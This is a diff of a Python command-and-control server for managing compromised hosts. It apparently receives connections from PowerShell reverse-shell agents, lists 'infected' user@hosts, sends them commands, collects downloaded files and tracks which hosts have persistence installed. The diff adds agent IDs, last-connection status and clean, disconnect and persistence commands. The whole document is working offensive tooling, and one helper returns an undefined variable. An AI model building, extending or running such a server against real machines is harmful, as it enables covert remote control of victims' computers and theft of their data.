@@ -3,15 +3,19 @@ import threading
 import globals, certificate, modulescontroller
 from Color import Color
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import readline, base64, urllib.parse, time, ssl, argparse, json, ipaddress
+import readline, base64, urllib.parse, time, ssl, argparse, json, ipaddress, datetime
 from os import listdir, sep, path
 
 allowed_net = ipaddress.ip_network('78.157.129.0/24')
 priv_net = list(allowed_net.hosts())
 bypass = False
-agents = []
+agents = {}
+agentsdate = {}
+agentspersist = {}
 agent = ""
-background=False
+background = False
+supercommand = ""
+agentsid = 0
 class myHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
@@ -44,9 +48,19 @@ class myHandler(BaseHTTPRequestHandler):
             user = self.getUser(json_response)
             hostname = self.getHostName(json_response)
             userhost = "{}@{}".format(user,hostname)
+            lock = threading.Lock()
+            global agentsid
+            lock.acquire()
             global agents
-            if not userhost in agents:
-                agents.append(userhost)
+            if not userhost in agents.values():
+                agentsid += 1
+                agents[str(agentsid)] = userhost
+                if not userhost in agentspersist.keys():
+                    agentspersist[userhost] = False
+            lock.release()
+            datenow = datetime.datetime.now()
+            global agentsdate
+            agentsdate[userhost] = datenow
             if (self.isDownloadFunctCalled(json_response)):
                 filename, content, output = self.parseDownload(json_response)
                 try:
@@ -61,8 +75,13 @@ class myHandler(BaseHTTPRequestHandler):
                     self.printResult(result, "F_" + color.capitalize(), userhost)
             try:
                 if userhost == agent:
-                    command = self.newCommand(pwd,user,hostname)
+                    global supercommand
+                    if supercommand == "":
+                        command = self.newCommand(pwd,user,hostname)
+                    else:
+                        command = supercommand
                     self.sendCommand(command, html)
+                    supercommand = ""
             except (AttributeError, BrokenPipeError) as e:
                 print (e)
         else:
@@ -103,7 +122,7 @@ class myHandler(BaseHTTPRequestHandler):
                 pass
         else:
             src_ip, src_port = self.client_address
-            print(Color.F_Red + "[!] New Connection from IP {} port {} ".format(src_ip, src_port) + Color.reset)
+            print(Color.F_Red + "\n[!] New Connection from IP {} port {} ".format(src_ip, src_port) + Color.reset)
         return result, parser_type, data, color
 
     def parseDownload(self, json_result):
@@ -172,7 +191,7 @@ class myHandler(BaseHTTPRequestHandler):
         elif pwd != "":
             #readline.parse_and_bind("tab: complete")
             command = input(Color.F_Red+ "{}@{}".format(user,hostname) + Color.reset + Color.F_Blue + " PS {}> ".format(pwd) + Color.reset)
-            if command == "bg":
+            if command == "bg" or command == "exit":
                 global background
                 background = True
                 global agent
@@ -202,13 +221,163 @@ class myHandler(BaseHTTPRequestHandler):
         else:
             return None
 
+def getidfromhost(host):
+    for agentid, userhost in agents.items():
+        if userhost == host:
+            return agentid
+
+    return auxid
+
+def listagents():
+    print(Color.F_Blue + "\nList of user@hosts infected" + Color.reset)
+    print(Color.F_Blue + " - ID / USER@HOST / LAST CONNECTION / STATUS / PERSISTENT" + Color.reset)
+    current_date = datetime.datetime.now()
+    for agentid, userhost in agents.items():
+        agentdate = agentsdate[userhost]
+        check = current_date-agentdate
+        if check > datetime.timedelta(minutes=1):
+            status = "Disconnected"
+            Colorprint = Color.F_Red
+        else:
+            status = "Connected"
+            Colorprint = Color.F_Green
+        print(Colorprint + " - " + str(agentid) + " / " + userhost + " / " + str(agentdate) + " / " + status + " / " + str(agentspersist[userhost]) + Color.reset)
+    print("")
+
+def persistenceagents(action):
+    global agentspersist
+    if not action.split(" ")[2] in agents.values() and not action.split(" ")[2] in agents.keys():
+        host = input("Choose the user@host or ID you want to mark as persist: ")
+        if not host in agents.values() and not host in agents.keys():
+            print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
+        else:
+            if host in agents.values():
+                if action.split(" ")[1] == "add":
+                    agentspersist[host] = True
+                elif action.split(" ")[1] == "del":
+                    agentspersist[host] = False
+                else:
+                    print(Color.F_Red + "Please set add or del in command" + Color.reset)
+            else:
+                if action.split(" ")[1] == "add":
+                    agentspersist[agents[host]] = True
+                elif action.split(" ")[1] == "del":
+                    agentspersist[host] = False
+                else:
+                    print(Color.F_Red + "Please set add or del in command" + Color.reset)
+    else:
+        if action.split(" ")[2] in agents.values():
+            if action.split(" ")[1] == "add":
+                agentspersist[action.split(" ")[2]] = True
+            elif action.split(" ")[1] == "del":
+                agentspersist[action.split(" ")[2]] = False
+            else:
+                print(Color.F_Red + "Please set add or del in command" + Color.reset)
+        else:
+            if action.split(" ")[1] == "add":
+                agentspersist[agents[action.split(" ")[2]]] = True
+            elif action.split(" ")[1] == "del":
+                agentspersist[agents[action.split(" ")[2]]] = False
+            else:
+                print(Color.F_Red + "Please set add or del in command" + Color.reset)
+    listagents()
+
+
+def cleanagents(action):
+    global agents
+    if action.split(" ")[1] == "all":
+        print("Cleaning all agents from the list")
+        agents = {}
+    else:
+        if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
+            host = input("Choose the user@host or ID you want to clean from list: ")
+            if not host in agents.values() and not host in agents.keys():
+                print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
+            else:
+                if host in agents.values():
+                    agentidaux = getidfromhost(host)
+                else:
+                    agentidaux = host
+                del agents[agentidaux]
+        else:
+            if action.split(" ")[1] in agents.values():
+                agentidaux = getidfromhost(action.split(" ")[1])
+            else:
+                agentidaux = action.split(" ")[1]
+            del agents[agentidaux]
+    listagents()
+
+def disconnectagents(action):
+    global supercommand
+    global agents
+    global agent
+    supercommand = "exit"
+    if action.split(" ")[1] == "all":
+        print("Disconnecting all agents from the list")
+        for host in agents.values():
+            agent = host
+    else:
+        if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
+            host = input("Choose the user@host or ID you want to disconnect from list: ")
+            if not host in agents.values() and not host in agents.keys():
+                print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
+            else:
+                if host in agents.values():
+                    agent = host
+                else:
+                    agent = agents[host]
+        else:
+            if action.split(" ")[1] in agents.values():
+                agent = action.split(" ")[1]
+            else:
+                agent = agents[action.split(" ")[1]]
+    time.sleep(2)
+    cleanagents(action)
+def interactagents(action):
+    global agent
+    notagent = False
+    if not action.split(" ")[1] in agents.values() and not action.split(" ")[1] in agents.keys():
+        host = input("Choose the user@host or ID you want to receive the shell: ")
+        if not host in agents.values() and not host in agents.keys():
+            print(Color.F_Red + "You don't have this agent on your list, please execute list and use one of those agents." + Color.reset)
+            notagent = True
+        else:
+            if host in agents.values():
+                agent = host
+            else:
+                agent = agents[host]
+    else:
+        if action.split(" ")[1] in agents.values():
+            agent = action.split(" ")[1]
+        else:
+            agent = agents[action.split(" ")[1]]
+    if notagent == False:
+        while True:
+            try:
+                if background == True:
+                    break
+                current_date = datetime.datetime.now()
+                if not agent == "":
+                    agentdate = agentsdate[agent]
+                    check = current_date-agentdate
+                    if check > datetime.timedelta(minutes=1):
+                        print("")
+                        print(Color.F_Red + "Agent disconnected" + Color.reset)
+                        print("")
+                        break
+            except KeyboardInterrupt:
+                break
+
 def printmenu():
     print(Color.F_Blue + """
 Select from the menu:
     1) List
-    2) Interact <userhost>
-    3) Help (Print this message)
-    4) Exit
+    2) Interact <userhost or ID>
+    3) Clean <userhost or ID/all> (Remove the agent from the agent list)
+    4) Disconnect <userhost or ID/all> (Disconnect the agent and remove from list)
+    5) Persistence <add or del> <userhost or ID> (Only mark if persistence have been done on host)
+    6) Help (Print this message)
+    7) Exit
 """ + Color.reset)
 
 def main():
@@ -256,6 +425,9 @@ def main():
         if (args.bypass):
             global bypass
             bypass = args.bypass
+        global agents
+        global agent
+        global supercommand
         server_thread = threading.Thread(target=server.serve_forever)
         # Exit the server thread when the main thread terminates
         server_thread.daemon = True
@@ -266,30 +438,43 @@ def main():
             background = False
             action = input("Choose your action from menu: ")
             if action == "list" or action == "List" or action == "1":
-                time.sleep(5)
-                print("List of user@hosts infected")
-                for userhost in agents:
-                    print("- " + userhost)
-            if action.split(" ")[0] == "interact" or action.split(" ")[0] == "Interact" or action == "2" or action.split(" ")[0] == "2":
-                global agent
-                if not action.split(" ")[1] in agents:
-                    host = input("Choose the user@host you want to receive the shell: ")
-                    agent = host
+                time.sleep(1)
+                listagents()
+            if action.split(" ")[0] == "interact" or action.split(" ")[0] == "Interact" or action.split(" ")[0] == "2":
+                if not len(action.split(" ")) == 2:
+                    print(Color.F_Red + "Wrong interact command syntax, please check help" + Color.reset)
+                    printmenu()
                 else:
-                    agent = action.split(" ")[1] 
-                while True:
-                    if background == True:
-                        break
-            if action == "help" or action == "Help" or action == "3":
+                    interactagents(action)
+            if action.split(" ")[0] == "clean" or action.split(" ")[0] == "Clean" or action.split(" ")[0] == "3":
+                if not len(action.split(" ")) == 2:
+                    print(Color.F_Red + "Wrong clean command syntax, please check help" + Color.reset)
+                    printmenu()
+                else:
+                    cleanagents(action)
+
+            if action.split(" ")[0] == "Disconnect" or action.split(" ")[0] == "disconnect" or action.split(" ")[0] == "4":
+                if not len(action.split(" ")) == 2:
+                    print(Color.F_Red + "Wrong clean command syntax, please check help" + Color.reset)
+                    printmenu()
+                else:
+                    disconnectagents(action)
+            if action.split(" ")[0] == "persistence" or action.split(" ")[0] == "Persistence" or action.split(" ")[0] == "5":
+                if not len(action.split(" ")) == 3:
+                    print(Color.F_Red + "Wrong clean command syntax, please check help" + Color.reset)
+                    printmenu()
+                else:
+                    persistenceagents(action)
+            if action == "help" or action == "Help" or action == "6":
                 printmenu()
-            if action == "exit" or action == "Exit" or action == "4":
+            if action == "exit" or action == "Exit" or action == "7":
                 server.socket.close()
                 print(Color.reset)
                 break
                 
     except KeyboardInterrupt:
         print("")
-        print("Pressed KeyboardInterrupt:")
+        print(Color.F_Red + "Pressed KeyboardInterrupt:" + Color.reset)
         print ('Received, shutting down the web server')
         server.socket.close()
         print(Color.reset)
